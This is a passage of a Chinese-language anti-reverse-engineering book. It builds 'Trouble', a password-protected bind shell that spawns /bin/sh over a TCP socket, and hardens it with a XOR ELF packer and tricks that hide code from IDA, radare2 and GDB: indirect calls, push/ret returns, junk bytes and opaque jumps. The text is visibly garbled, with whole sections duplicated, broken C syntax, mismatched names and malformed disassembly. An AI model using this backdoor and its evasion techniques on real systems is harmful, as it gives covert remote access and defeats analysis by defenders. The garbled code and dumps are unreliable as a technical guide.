// 用真实值替换汇编中的值
memcpy(stub + 3, &virt_start, 4);
memcpy(stub + 10, &ehdr->e_entry, 4);
memcpy(stub + 40, &actual, 4);
```

```cpp
// 将存根拷贝到二进制文件中
memcpy(&p_data[segment->p_size], stub, sizeof(stub));

// "加密"
char xorValue = 0xaa;
for (uint32_t i = encrypt_start; i < segment->p_size; i++)
{
    p_data[i] ^= xorValue;
}

return true;
```

```cpp
int main(int argc, char** p_argv)
{
    if (argc != 2)
    {
        std::cerr << "Usage: ./cryptor <file path>" << std::endl;
        return EXIT_FAILURE;
    }

    std::ifstream inputFile(p_argv[1], std::ifstream::in | std::ifstream::binary);
    if (!inputFile.is_open() || !inputFile.good())
    {
        std::cerr << "Failed to open the provided file: " << p_argv[1] << std::endl;
        return EXIT_FAILURE;
    }

    std::string input((std::istreambuf_iterator<char>(inputFile), std::istreambuf_iterator<char>());
    inputFile.close();

    if(!add_cryptor(input))
    {
        return EXIT_FAILURE;
    }
```

# 第 4 章：对抗字符串分析



```cmake
set(CMAKE_C_FLAGS "-Wall -Wextra -Wshadow -03 -static -std=gnu")
executable(${PROJECT_NAME} src/trouble.c src/rc4.c)

add_custom_target(addLDS
COMMAND -i e 's,$o${CMAKE_CURRENT_SOURCE_DIR}/trouble_layout.lds -o,g' ./CMake/trouble.dir/link.txt)

add_dependencies(${PROJECT_NAME} addLDS)

# 编译成功后，显示随机密码
add_custom_command(TARGET ${PROJECT_NAME} POST_BUILD
COMMAND ${CMAKE_COMMAND} -E echo "The bind shell password is:\${random_password}")

add_custom_command(TARGET ${PROJECT_NAME}
POST_BUILD
COMMAND ../encryptFunctions/encryptFunctions ${CMAKE_CURRENT_BINARY_DIR}/${PROJECT_NAME}_Y_DIR/${PROJECT_NAME})

add_custom_command(TARGET ${PROJECT_NAME}
POST_BUILD
COMMAND ../cryptor/cryptor ${CMAKE_CURRENT_BINARY_DIR}/${PROJECT_NAME})
```

`Crypt` 其实非常简单。它在第一个 `LOAD` 段中追加一些汇编代码，并修改入口点（entry point）使其指向这些追加的汇编代码。追加的汇编代码会对 `LOAD` 段执行异或解混密，然后跳转到真正的入口点。仅此而已。

# 分析加密部分

重新编译 `Trouble` 后，查看入口点和程序头信息。

# 应用 Cryptor 后 Trouble 的 ELF 头部

```
albino-lobster@ubuntu:~/antire-book/chap_4_static_analysis/dontpanic/build$ readelf -h ./trouble/trouble
```

```
ELF Header:
Magic:             7f 45 4c 46 4c 02 01 00 00 00 00 00 00 00
Class:              ELF64
Data:               2's complement, little endian
Version:            1 (current)
OS/ABI:            UNIX - System V
ABI Version:        0
Type:               EXEC (Executable file)
Machine:           Advanced Micro Devices X86-64
Version:            0x1
Entry point address: 0x403154
Start of program headers: 64 (bytes into file)
Start of section headers: 22752 (bytes into file)
Flags:              0
Size of this header: 64 (bytes)
Size of program headers: 56 (bytes)
Number of program headers: 4
Size of section headers: 64 (bytes)
Number of section headers: 17
Section header table index: 14
```

### 应用 Cryptor 后 Trouble 的程序头

```
albino-lobster@ubuntu:~/antire-book/chap_4_static_analysis/dontpanic/build$ l ./trouble
```

文件类型为 `EXEC` (可执行文件)

入口点 `0x403154`

有 4 个程序头，从偏移量 64 开始。

程序头：

| Type | Offset | VirtAddr | PhysAddr |
| --- | --- | --- | --- |
| `LOAD` | `FileSize` `MemSize` `Flags` `Align` |
| | `0x0000000000000000` `0x0000000000000000` `0x0000000000000000` |
| | `0x0000000000000314` `0x0000000000000314` `RWE` `200000` |
| `LOAD` | `0x00000000000003fe8` `0x00000000000003fe8` `0x00000000000003fe8` |
| | `0x00000000000001f8` `0x0000000000000538` `RW` `200000` |

```
GNU_STACK      0x0000000000000000 0x0000000000000000 0x0000000000000000
                              0x0000000000000000 0x0000000000000000 RW 10
GNU_RELRO      0x00000000000003fe8 0x0000000000000603 0x00000000000003fe8
                              0x0000000000000018 0x0000000000000018 R 1
```

段到段映射：

段 节...

```
00 .init .text .check_password .fini .rodata .eh_frame
01 .init_array .fini_array .jcr .data .rc4_password .bss
02
03 .init_array .fini_array .jcr
```

注意 `LOAD` 段的末尾是 `Cryptor` 插入的地方。

```
albino-lobster@ubuntu:~/antire-book/chap_4_static_analysis/dontpanic/build$ radare2
```

# 第 5 章：阻碍代码流分析

### 从 `main()` 调用 `check_password()`

```
.text:0000000000400026B lea rdi, [rsp+78h+var_48]
.text:000000000040026D call check_password
```

让我们尝试使用函数指针来隐藏这个直接调用。在 `check_password()` 函数下方我添加了以下声明：

```cpp
bool (*indirect_call)(const char*) = check_password;
```

这是一个指向 `check_password()` 的函数指针。接下来，我使用函数指针更新了 `main()` 中对 `check_password()` 的调用。

### 使用函数指针调用 `check_password()`

```
if ((indirect_call)(password_input))
{
    close(client_sock);
    return EXIT_FAILURE;
}
```

让我们重新编译 `Trouble`，看看 `IDA` 现在对 `check_password()` 的交叉引用（cross references）是如何说的。

## `check_password()` 的代码和数据交叉引用

```
.text:0000000000400410 public check_password
.text:0000000000400410 check_password proc near ; CODE XREF: main+13
.text:0000000000400410 ; DATA XREF: .data:indirect_call
.text:0000000000400410
.text:0000000000400410
.text:0000000000400410 var_38 = xmmword ptr -38h
.text:0000000000400410 var_28 = xmmword ptr -28h
.text:0000000000400410 var_18 = byte ptr -18h
.text:0000000000400410 var_10 = qword ptr -10h
```

嗯……这并没有改进。通过使用函数指针，我导致了一个交叉引用和一个代码交叉引用！让我们看看 `main()` 中对 `check_password()` 的调用。

# 第 5 章：阻碍代码流分析

### 通过函数指针调用 `check_password()`

```
.text:0000000000400268      lea rdi, [rsp+78h+var-48]
.text:000000000040026D      call cs:indirect_call
```

代码被分解为我想要实现的间接函数调用。`IDA` 如何知道该调用是给 `check_password()` 的？如果你在 `IDA` 中双击 `cs:indirect_call` 链接，就会跳转到这里：

### `.data` 中 `indirect_call` 的定义

```
.data:0000000000603008  public indirect_call
.data:0000000000603008  indirect_call  dq offset check_password ; DATA XREF:main+13
```

好吧，这就足够。`IDA` 必须正在查看 `indirect_call` 中存储的值，并使用该值来确定调用的去向。尝试用 `NULL` 代替 `check_password()` 初始化函数指针。

```cpp
bool (*indirect_call) (const char*) = NULL;
```

接下来更新 `main()` 将 `check_password()` 存储在 `indirect_call` 中。

### 更新 `Trouble` 的 `main()` 将 `check_password()` 存储在 `indirect_call` 中

```cpp
int main(int argc, char* p_argv[])
{
    (void)p_argc;
    (void)p_argv;
    indirect_call = check_password;
}
```

重新编译后，看看 `IDA` 的。

# 第 5 章：阻碍代码流分析

### 只有数据引用的 `check_password()`

| public check_password proc near ; DATA XREF: main+15 |
| :--- |
| var_38 = xmmword ptr -38h |
| = xmmword ptr -28h |
| var_18 = byte ptr -18h |
| var_18 = qword ptr -10h |

这是一个改进！代码引用不再存在了，而数据引用移到了 `main()` 的顶部。

### 对 `check_password()` 的数据交叉引用

| mov cs:indirect_call, offset check_password |
| mov ra, fs:28h |
| mov [rsp+78h+var_20], ra |
| xor eax, eax |
| call socket |

对 `check_password()` 的调用看起来和将 `indirect_call` 初始化为 `NULL` 之前是一样的。

### 对 `check_password()` 的间接调用

| lea rdi, [rsp+78h+var_48] |
| call cs:indirect_call |

然而，`indirect_call` 不同了。它已经从 `.data` 移动到 `.bss` 没有默认值。

### 初始化为 `NULL` 后的 `indirect_call`

| .bss 00000000006003188 | public indirect_call |
| :--- | :--- |
| .bss 00000000006003188 indirect_call | dq ? ; DATA XREF: main+15 |
| .bss 00000000006003188 | main+145 |

相当不错。但也许你可以通过弄乱 `indirect_call` 中存储的地址来移除对 `check_password()` 的数据引用。让我们稍微修改一下 `main()` 顶部的赋值。

### 在 `indirect_call` 中存储错误的地址

```cpp
int main(int p_argc, char* p_argv[])
{
    (void)p_argc;
    (void)p_argv;
    indirect_call = check_password - 0x100;
}
```

我们随后必须在调用 `check_password()` 之前调整函数指针。

### 调整 `indirect_call` 中的地址

```cpp
indirect_call = indirect_call + 0x100;
if ((indirect_call)(password_input))
{
    close(client_sock);
    return EXIT_FAILURE;
}
```

如果你重新编译 `Trouble` 并放入 `IDA`，你应该看到这个。

# 第 5 章：阻碍代码流分析

### 只有数据引用的 `check_password()`

```
.text:0000000000400410 public check_password
.text:0000000000400410 check_password proc near ; CODE XREF: main+13
.text:0000000000400410 ; DATA XREF: .data:indirect_call
.text:0000000000400410
.text:0000000000400410
.text:0000000000400410 var_38 = xmmword ptr -38h
.text:0000000000400410 var_28 = xmmword ptr -28h
.text:0000000000400410 var_18 = byte ptr -18h
.text:0000000000400410 var_10 = qword ptr -10h
```

嗯……这并没有改进。通过使用函数指针，我导致了一个交叉引用和一个代码交叉引用！让我们看看 `main()` 中对 `check_password()` 的调用。

# 第 5 章：阻碍代码流分析

### 通过函数指针调用 `check_password()`

```
.text:0000000000400268      lea rdi, [rsp+78h+var-48]
.text:000000000040026D      call cs:indirect_call
```

代码被分解为我想要实现的间接函数调用。`IDA` 如何知道该调用是给 `check_password()` 的？如果你在 `IDA` 中双击 `cs:indirect_call` 链接，就会跳转到这里：

### `.data` 中 `indirect_call` 的定义

```
.data:0000000000603008  public indirect_call
.data:0000000000603008  indirect_call  dq offset check_password ; DATA XREF:main+13
```

好吧，这就足够。`IDA` 必须正在查看 `indirect_call` 中存储的值，并使用该值来确定调用的去向。尝试用 `NULL` 代替 `check_password()` 初始化函数指针。

```cpp
bool (*indirect_call) (const char*) = NULL;
```

接下来更新 `main()` 将 `check_password()` 存储在 `indirect_call` 中。

```cpp
int main(int argc, char* p_argv[])
{
    (void)p_argc;
    (void)p_argv;
    indirect_call = check_password;
}
```

重新编译后，看看 `IDA` 的。

# 第 5 章：阻碍代码流分析

### 只有数据引用的 `check_password()`

| public check_password proc near ; DATA XREF: main+15 |
| :--- |
| var_38 = xmmword ptr -38h |
| = xmmword ptr -28h |
| var_18 = byte ptr -18h |
| var_18 = qword ptr -10h |

这是一个改进！代码引用不再存在了，而数据引用移到了 `main()` 的顶部。

### 对 `check_password()` 的数据交叉引用

| mov cs:indirect_call, offset check_password |
| mov ra, fs:28h |
| mov [rsp+78h+var_20], ra |
| xor eax, eax |
| call socket |



对`check_password()`的调用看起来和将`indirect_call`初始化为`NULL`之前是一样的。

### 对 check_password() 的间接调用

```
lea rdi, [rsp+78h+var_48]
call cs:indirect_call
```

然而，`indirect_call`不同了。它已经从`.data`移动到`.bss`没有默认值。

### 初始化为 NULL 后的 indirect_call

```
.bss 00000000006003188 public indirect_call
.bss 00000000006003188 indirect_call dq ? ; DATA XREF: main+15
.bss 00000000006003188 main+145
```

相当不错。但也许你可以通过弄乱`indirect_call`中存储的地址来移除对`check_password()`的数据引用。让我们稍微修改一下`main()`顶部的赋值。

```cpp
int main(int p_argc, char* p_argv[])
{
    (void)p_argc;
    (void)p_argv;
    indirect_call = check_password - 0x100;
}
```

我们随后必须在调用`check_password()`之前调整函数指针。

```cpp
indirect_call = indirect_call + 0x100;
if ((indirect_call)(password_input))
{
    close(client_sock);
    return EXIT_FAILURE;
}
```

如果你重新编译 Trouble 并放入 IDA，你应该看到这个。

# 第 5 章：阻碍代码流分析

### 只有数据引用的 check_password()

```
.text:0000000000400410 public check_password
.text:0000000000400410 check_password proc near ; CODE XREF: main+13
.text:0000000000400410 ; DATA XREF: .data:indirect_call
.text:0000000000400410
.text:0000000000400410
.text:0000000000400410 var_38 = xmmword ptr -38h
.text:0000000000400410 var_28 = xmmword ptr -28h
.text:0000000000400410 var_18 = byte ptr -18h
.text:0000000000400410 var_10 = qword ptr -10h
```

Nice. 只有数据引用的 check_password().

### 信号

Nice. 只有数据引用的 check_password().

- 。
- man sigaction
- man 7

# 第 5 章：阻碍代码流分析

### 调用 spawn_shell() 调用 SIGUSR1

```c
#include "stdio.h"
```

```c
bool check_password(const char* password)
{
    char pass[32] = {};
    XOR_STRING(pass, password, 32);
    return memcmp(pass, password, 32) != 0;
}
```

```c
void spawn_shell()
{
    char* empty[] = { NULL };
    char* bishpy[] = {'/', 'b', 'n', 's', 'h', 'l', 0};
    execve(empty, bishpy, empty);
}
```

```c
/**
 * This implements a simple bind shell. The server first requires a
 * password before allowing access to the shell. The password is currently
 * generated each time 'cmake ..' is run. The server has no shutdown
 * mechanism so it will run until killed.
 */
```

```c
int main(int argc, char* argv)
{
    (void)p_argc;
    (void)p_argv;
    struct sigaction val;
```

```c
val.sa_flags = SA_SIGINFO;
sVal.sa_sigaction = spawn_shell;
sigaction(SIGUSR1, &sVal, NULL);
```

```c
int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
if (sock == -1)
{
    fprintf(stderr, "Failed to create the socket.");
    return EXIT_FAILURE;
}
struct sockaddr_in bind_addr = {};
bind_addr.sin_family = AF_INET;
bind_addr.sin_addr.s_addr = htonl(INADDR_ANY);
bind_addr.sin_port = htons(12780);
int bind_result = bind(sock, (struct sockaddr*)&bind_addr,
sizeof(bind_addr));
if (bind_result != 0)
{
    perror("Bind call failed");
    return EXIT_FAILURE;
}
int listen_result = listen(sock, 5);
if (listen_result != 0)
{
    perror("Listen call failed");
    return EXIT_FAILURE;
}
while (true)
{
    int client_sock = accept(sock, NULL, NULL);
    if (client_sock < 0)
    {
        perror("Accept call failed");
        return EXIT_FAILURE;
    }
    int child_pid = fork();
    if (child_pid == 0)
{
```

# 第5章：阻碍代码流分析

```c
// 读取密码
char password_input[password_size] = { };
int read_result = read(client_sock, password_input, password_size - 1);
if (read_result < (int)(password_size - 1)) {
    close(client_sock);
    return EXIT_FAILURE;
}
if (check_password(password_input)) {
    close(client_sock);
    return EXIT_FAILURE;
}
dup2(client_sock, 0);
dup2(client_sock, 1);
dup2(client_sock, 2);
kill(getpid(), SIGUSR1);
close(client_sock);
return EXIT_SUCCESS;
}
```

在上面的代码，我引入了一个新函数`spawn_shell()`，它包含了执行"/bin/sh"的逻辑。注意看，它从未被直接调用？并不是直接调用`spawn_shell()`，而是这一行代码触发了它的执行：

```c
kill(getpid(), SIGUSR1);
```

当 Trouble 接收到 SIGUSR1 信号时，`spawn_shell()`函数就会执行。这使得静态分析变得更加困难，因为这迫使逆向工程师追踪所有的`sigaction()`调用，以确定每个信号触发了哪个函数。否则，逆向工程师只会看到这些：

### 通过 kill() 调用 spawn_shell()

```assembly
.text:000000000004002A4    call      check_password
.text:000000000004002A9    test      al, al
.text:000000000004002AB    jnz       short loc_402ED
.text:000000000004002AD    xor       esi, esi
.text:000000000004002AF    mov       edi, ebx
.text:00000000000402B1    call      dup2
.text:00000000000402B6    mov       esi, 1
.text:00000000000402BB    mov       edi, ebx
.text:00000000000402BD    call      dup2
.text:00000000000402C2    mov       esi, 2
.text:00000000000402C7    mov       edi, ebx
.text:00000000000402C9    call      dup2
.text:00000000000402CE    call      getpid
.text:00000000000402D3    mov       esi, 0Ah
.text:00000000000402D8    mov       edi, eax
.text:00000000000402DA    call      kill
.text:00000000000402DF    mov       edi, ebx
.text:00000000000402E1    call      close
.text:00000000000402E6    xor       eax, eax
```

### 早期返回

隐藏 *Trouble* 逻辑的另一种方法是欺骗反汇编器提前退出 *check_password()* 函数。实现此点的一种方法是将一个地址推入栈中并立即返回。这将导致程序返回到栈上的地址。在 malwinator.com 上有一篇关于这种技术的非常好的文章，但我们自己创建一个示例。

为了使用早期返回技术，你需要在 *check_password()* 中创建一个标签，并使用内联汇编将标签地址推栈。更新后的 *check_password()* 如下：

### 返回到 check_password() 的中间

```c
bool __attribute__((optimize("01"))) check_password(const char* p_password)
{
    char pass[password_size] = {};
    asm volatile(
        "push %%0\n"
        "ret\n"
        : "g" (return_here);
    return_here:
    XOR_STRING(pass, password, 0xaa);
    // 验证密码
    return memcmp(undo_xor_string(pass, 32, 0xaa, p_password, 32) != 0;
```

这里有两个有趣的地方：1. 我在函数声明中引入了`optimize`属性。这将该函数的优化级别保持为 "0"，因为高等级优化通常会移动位置并破坏程序。2. 我使用了 GCC 扩展来获取 "return_here:" 标签的地址。在标签前使用 "&" 可以获取标签的地址。

如果你混淆这段代码，你会发现并没有被混淆。

### 混淆失败

```assembly
.text:0000000000000740      push rbx
.text:0000000000000741      sub rsp, 30h
.text:0000000000000745      mov rdx, rdi
.text:0000000000000748      mov rax, fs:28
.text:0000000000000751      mov [rsp+38h-var_10], rax
.text:0000000000000755      xor eax, eax
.text:0000000000000758      mov byte ptr [rsp+38h-var_18], 0
.text:000000000000075D      push offset loc_40763
.text:0000000000000762      ret
----------------------------------------
.text:0000000000000763      ;
.text:0000000000000763      loc_40763:
.text:0000000000000763      ; CODE XREF: check_password+22
```

```assembly
.text:0000000004000763 ; DATA XREF: check_password+1D
.text:0000000004000763 mov [rsp+38h+var_19], D2h
.text:0000000004000768 mov [rsp+38h+var_1A], Ah
```

正如你在上一节中看到的，IDA 跟踪了 check_password 推入栈的地址。你需要通过某种方式混淆或计算标签的地址，以防止反汇编器追踪：

### 混淆返回地址

```c
char* calc_addr(char* p_addr)
{
    return p_addr + 0x400000;
}
```

```c
bool __attribute__((optimize("01"))) check_password(const char* p_password)
{
    char pass[password_size] = {};
    char* label_address = calc_addr((char*)&return_here) - 0x400000;
    asm volatile(
        "push %0\n"
        "ret\n"
        : "g" (label_address);
    );

return_here:
    XOR_STRING(pass, password, 0xaa);

    // 验证密码
    return memcmp(undo_xor_string(pass, 32, 0xaa, p_password, 32) != 0;
}
```

你可以看到我做的只是在标签地址上减去并加上 0x400000。然而，反汇编结果更符合我的审美。

### check_password() 中的早期返回隐藏了代码

```bash
albino-lobster@ubuntu:~antire_book/chap_5_code_flow/dontpanic/build$ radare2 /trouble/trouble
Warning: Cannot initialize dynamic strings
Wow, 我的猫比我还懂 radare2 快捷键！
```

```
[0x004003c> aaa

[x] Analyze all flags starting with mim, and entry@ (aa)

[x] Analyze len bytes instructions for references (aar)

[x] Analyze function calls (aac)

[ ] [* Use-AA or aaa to perform additional analysis.

[x] Constructing a function name for fn.* and sym.func.* functions (aan)

[0x004003c> pdf @ sym.check_
```

很酷，对吧？在你过度兴奋之前，仍然有一个问题。在图形视图中，IDA 看起来相似。然而，在文本视图中你可以看到你正在尝试隐藏。注意 IDA 如何继续反汇编 0x40077B？它将这段代码标记为没有交叉引用，但仍继续反汇编。但是，也许如果你插入一些非代码，IDA 就会停止反汇编？要插入某些数据，请使用 "string" 指令。

# 第 5 章：破坏代码流分析

通过插入非代码来停止 IDA 的反汇编

```c
char* calc_addr(char* p_addr)
{
    return p_addr + 0x400000;
}
```

```c
bool __attribute__((optimize("01"))) check_password(const char* p_password)
{
```



```c
char pass[password_size] = {};

char* label_address = calc_addr((char*)&return_here) - 0x400000;

asm volatile(

    "push %0\n"

    "ret\n"

    ".string\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\""

)

: "g"(label_address));

}
```

```c
return_here:

XOR_STRING31(pass, password, 0xaa);

// 验证密码

return memcmp(undo_xor_string(pass, 32, 0xaa), p_password, 32) != 0;

}
```

如果你查看反汇编，你会发现 IDA 没有反汇编 `check_password()` 的大部分部分。

最后对 `check_password()` 的分析

```assembly
.text:00000000000400750    public check_password

.text:00000000000400750    check_password  proc near      ; CODE XREF:main+13D

.text:00000000000400750

.text:00000000000400750    var_18          = byte ptr -18h

.text:00000000000400750    var_18          = qword ptr -10h

.text:00000000000400750

.text:00000000000400750    push            rbx

.text:00000000000400751    sub             rsp, 30h

.text:00000000000400755    mov             rbx, rdi

.text:00000000000400758    mov             rax, fs:28h

.text:00000000000400761    mov             [rsp+38h+var_10], rax

.text:00000000000400766    xor             eax, eax

.text:0000000004000768 mov      [rsp+38+var_18], 0

.text:000000000400076D mov      rdi, 787h

.text:0000000004000774 call     calc_addr

.text:0000000004000779 push     rax

.text:000000000400077A retn

.text:000000000400007A check_password  endp ; sp-analysis failed

.text:000000000400007A ;

.text:000000000400007B8 db     72h, 73h, 74h, 75h, 76h, 44C6E1D2444C69Ah

.text:00000000040007D0 dq     0E6907F7E2A797B7h, 1E2444C6D21F2F244h, 2444C6D1A244C66h, 06ED182444C66E19h

.text:00000000040007D0 dq     0E21B82444C9C9D124h, 2444C6D1A244C66h, 06ED182444C66E19h, 92123446C51A424h

.text:00000000040007D0 dq     162444C6D172444h, 44C6C651A244C514h, 92123446C51A424h

.text:00000000040007D0 dq     2444C69C4212244h, 06C7102444C6CF11h, 0E244466E30F244h

.text:00000000040007D0 dq     44C6920D2D469h, 06B0424C9E6C2h, 44E6A2A2C6A

.text:00000000040007D0 dq     06CE0E8244C90Dh, 62446F270244h, 44C6F305244Bh

.text:00000000040007D0 dq     0F2032444C60Ah, 244C6FD224h, 0AABAE0240C650h

.text:00000000040007D0 dq     20BEFFFF, 0FFFFBDEE789h, 00DE894800002Bh

.text:00000000040007D0 dq     68B8EC67948h, 4C8B095FC085h, 28250C3384624h

.text:0000000004000868 ;

.text:000000000400088B add      rsp, 30h

.text:00000000040008C pop      rbx

.text:000000000400089D retn
```

### 跳转无效字节

在上一节中，你可以让 IDA 和 Radare2 停止反汇编 `check_password()` 的大部分内容。然而，一眼代码就能看出 `0x787` 被传递给了 `calc_addr()`，并且使用 `ret` 跳转到 `calc_addr()` 返回的地址。隐藏这种信息的一种方法是 Silvio Cesare 在 1999 年的文章《Linux调试技巧（跟踪调试器）中描述的。首先，让我们看看 `check_password()` 在 GDB 中是长样的。

http://vxheaven.org/lib/vsc04.html

## 第 5 章：破坏代码流分析

albino@ubuntu:/antire_book/chap_5_code_flow/dontpanic/build gdb ./trouble

GNU gdb (Ubuntu 7.11.1-0ubuntu16.04) 7.11.1

Copyright (C) 2016 Free Software Foundation, Inc.

License GPL3+: GNU version 3 or later <http://www.gnu.org/licenses/gpl>

这是自由软件：你可以修改并重新发行。

法律允许范围内不担保。输入 "show copying" 查看详情。

此 GDB 配置为 `x86_64-linux-gnu`。

输入 "show configuration" 查看配置。

要报告错误请参见：

http://www.gnu.org/software/gdb/bugs/

在线查找 GDB 手册和其他文档资源：

http://www.gnu.org/software/gdb/documentation/index.html

需帮助，请输入 "help"。

输入 "apropos word" 搜索与 "word" 命令...

从 .trouble/trouble 读取符号...（未找到调试符号)..完成

从 0x400750 到 0x4007b 的汇编转储：

```
0x0000000004007500 check_password+0:   push     %rbx
0x0000000004007501 check_password+1:    sub      $0x30,%rsp
0x0000000004007505 check_password+5:    mov      %rdx,rbx
0x0000000004007508 check_password+8:    mov      %fs:0x28,rax
0x0000000004007061 check_password+17:   mov      %rax,0x28(%rsp)
0x0000000004007066 check_password+22:   xor      %eax,%eax
0x0000000004007068 check_password+24:   movb     $0x0,20(%rsp)
0x000000000400706d check_password+29:   mov      $0x787,%rdi
0x0000000004007074 check_password+36:   call    0x400740 <calc_addr>
0x0000000004007079 check_password+41:   push     %rax
0x000000000400707a check_password+42:   retq
```

GDB 汇编转储结束。

在上一节中，你可以让 IDA 和 Radare2 停止反汇编 `check_password()` 的大部分内容。然而，一眼代码就能看出 `0x787` 被传递给了 `calc_addr()`，并且使用 `ret` 跳转到 `calc_addr()` 返回的地址。隐藏这种信息的一种方法是 Silvio Cesare 在 1999 年的文章《Linux调试技巧（跟踪调试器）中描述的。首先，让我们看看 `check_password()` 在 GDB 中是长样的。

http://vxheaven.org/lib/vsc04.html

## 第 5 章：破坏代码流分析

albino@ubuntu:/antire_book/chap_5_code_flow/dontpanic/build gdb ./trouble

GNU gdb (Ubuntu 7.11.1-0ubuntu16.04) 7.11.1

Copyright (C) 2016 Free Software Foundation, Inc.

License GPL3+: GNU version 3 or later <http://www.gnu.org/licenses/gpl>

这是自由软件：你可以修改并重新发行。

法律允许范围内不担保。输入 "show copying" 查看详情。

此 GDB 配置为 `x86_64-linux-gnu`。

输入 "show configuration" 查看配置。

要报告错误请参见：

http://www.gnu.org/software/gdb/bugs/

在线查找 GDB 手册和其他文档资源：

http://www.gnu.org/software/gdb/documentation/index.html

需帮助，请输入 "help"。

输入 "apropos word" 搜索与 "word" 命令...

从 .trouble/trouble 读取符号...（未找到调试符号)..完成

从 0x400750 到 0x4007f 的汇编转储：

```
0x0000000004007500 check_password+0:   push     %rbx
0x0000000004007501 check_password+1:    sub      $0x30,%rsp
0x0000000004007505 check_password+5:    mov      %rdx,rbx
0x0000000004007508 check_password+8:    mov      %fs:0x28,rax
0x0000000004007061 check_password+17:   mov      %rax,0x28(%rsp)
0x0000000004007066 check_password+22:   xor      %eax,%eax
0x0000000004007068 check_password+24:   movb     $0x0,20(%rsp)
0x000000000400706d check_password+29:   mov      $0x787,%rdi
0x0000000004007074 check_password+36:   call    0x400740 <calc_addr>
0x0000000004007079 check_password+41:   push     %rax
0x000000000400707a check_password+42:   retq
```

GDB 汇编转储结束。

(gdb)

你可以看到，在 0x40076d 处到 0x400771 的跳转现在存在了。这是在 GDB 汇编五个字节作为 `callq 0xfffffffc80f74` 之后。记住我们只插入了一个字节。GDB 似乎将我们的无效字节与四个有效字节结合在了一起。幸运的是，对于逆向工程师来说，x64 是由变长度指令组成的，因此具有“自愈”能力。

使用双重跳转 `check_password()` 来混淆代码

```c
char* calc_addr(char* p_addr)

{

    return p_addr + 0x400000;

}
```

```c
bool __attribute__((optimize("01"))) check_password(const char* p_password)

{

    char pass[password_size] = {};

    char* label_address = 0;

    asm volatile(

        "jz unaligned+1\n"

        "jnz unaligned+1\n"

        "unaligned:\n"

         ".byte 0xe8\n"

    );

    label_address = calc_addr(((char*)&return_here) - 0x400000);

    asm volatile(

        "push %0\n"

        "ret\n"

        ".string \x72\x73\x74\x76\x78\x77\x79\x7a\x7b\x7c\x7d\x7e\x7f\"

        :

        : "g(label_address)"

    );

    return_here:

    XOR_STRING31(pass, password, 0xaa);

    // 验证密码

    return memcmp(undo_xor_string(pass, 32, 0xaa), p_password, 32) != 0;

}
```

现在看看 IDA 是如何处理它的。

## 第 5 章：阻碍代码流分析

```assembly
.text:00000000000400750 public check_password

.text:00000000000400750 check_password: ; CODE XREF:main+13D

.text:00000000000400750 push rbx

.text:00000000000400751 rsp, 30h

.text:00000000000400755 mov rbx, rdi

.text:00000000000400758 mov ra, esp:28h

.text:00000000000400761 mov [rsp+28h], ra

.text:00000000000400766 xor eax, eax

.text:00000000000400768 byte ptr [rsp+20h], 0

.text:0000000000040076D jz short near aligned+1

.text:0000000000040076F jnz short near aligned+1

.text:00000000000400771 unaligned: ; CODE XREF:.text:000000000004006D

.text:00000000000400771 .text:000000000004007F

.text:00000000000400771 call near 0xFFFFFF0DCEBE

.text:00000000000400776 dw 7

.text:00000000000400778 dq 0DC350FF2E800, 7978776574547327, 1F2444007F

.text:00000000000400778 dq 0C6F31E244ACCF, 9D31244C6F0D1B244C6D4B4C69

.text:00000000000400778 dq 0DD1942444CEB1524, 2444C6D1324446A, 0C0D21244CCF1F

.text:00000000000400778 dq 0F2444617024A, 446F0EB44C62, 0C08D21144CC0D4

.text:00000000000400778 dq 24A4C6D0A2B244, 0C0D9924C6B0244, 72A4C6D024A4

.text:00000000000400778 dq 446F862446A93, 0C50444460524, 2444C6D79332446A

.text:00000000000400778 dq 0C6F0124446A9C02, 0FFAE32E04, 0E7894D000002BE

.text:0000000000040078 dq 20BAFFFFB3ED38, 0C7894D8E4B000, 0FC0850000693E8

.text:0000000000040078 dq 624872C4C4B80C95, 28250C33B8, 660000205E00E74, 841F0F4

.text:0000000000040870 add rsp, 30h
```



.text:0000000000040870

.text:0000000000040874 `pop rbx`

.text:0000000000040875 `ret`

```
.text:0000000000040870
.text:0000000000040874 pop rbx
.text:0000000000040875 ret
```

### 始终执行条件跳转

效果非常棒！虽然那个到目标的跳转很独特，但让我们深入一点。这次我们使用一个已经知道答案的条件。例如，如果你使用`jz`（如果为零则跳转）并且知道跳转总是会被执行，那么你就插入一个跳转跳转。如何确保跳转总是被执行？参见

## 第 5 章：阻碍代码流分析

`check_password()` 将条件跳转强制转换为绝对跳转

```c
char* calc_addr(char* p_addr)
{
    return p_addr + 0x400000;
}

bool __attribute__((optimize("01"))) check_password(const char* p_password)
{
    char pass[password_size] = {};
    char* label_address = 0;

    asm volatile(
        "xor %%rax, %%rax\n"
        "jz always_here + 1\n"
        "always_here:\n"
        ".byte 0xe8\n"
        :
        : "%%rax"
    );

    asm volatile(
        "unaligned+1\n"
        "jz unaligned+1\n"
        "jnz unaligned+1\n"
        "unaligned:\n"
        ".byte 0xe8\n"
    );

    label_address = calc_addr((char*)return_here) - 0x400000;

    asm volatile(
        "push %0\n"
        "ret\n"
        ".string \x72\x73\x74\x76\x78\x77\x79\x7a\x7b\x7c\x7d\x7e\x7f"
        :
        : "g(label_address)"
    );

    return_here:
    XOR_STRING31(pass, password, 0xaa);

    // 验证密码
    return memcmp(undo_xor_string(pass, 32), 32);
}
```

你可以看到我添加了一个清除`rax`并跳转到`always_here`的汇编块。IDA 的结果看起来如下：

### `check_password()` 中的绝对跳转

```assembly
.text:0000000000040070 public check_password
.text:00000000000400750 check_password:      CODE XREF:main+13D
.text:00000000000400750 push rbx
.text:00000000000400751 sub rsp, 30h
.text:00000000000400755 mov rdi, rdi
.text:00000000000400758 mov ra, rsp+28h
.text:00000000000400761 mov [rsp+28h], ra
.text:00000000000400766 xor eax, eax
.text:00000000000400768 mov byte ptr [rsp+20h], 0
.text:0000000000040076D jz short near always_here+1
.text:0000000000040076F jnz short near always_here+1
.text:00000000000400771 unaligned: CODE XREF:.text:000000000004006D
.text:00000000000400771 .text:000000000004007F
.text:00000000000400771 call near 0xFFFFFF0DCEBE
.text:00000000000400776 dw 7
.text:00000000000400778 dq 0DC350FF2E800, 7978776574547327, 1F2444007F
.text:00000000000400778 dq 0C6F31E244ACCF, 9D31244C6F0D1B244C6D4B4C69
.text:00000000000400778 dq 0DD1942444CEB1524, 2444C6D1324446A, 0C0D21244CCF1F
.text:00000000000400778 dq 0F2444617024A, 446F0EB44C62, 0C08D21144CC0D4
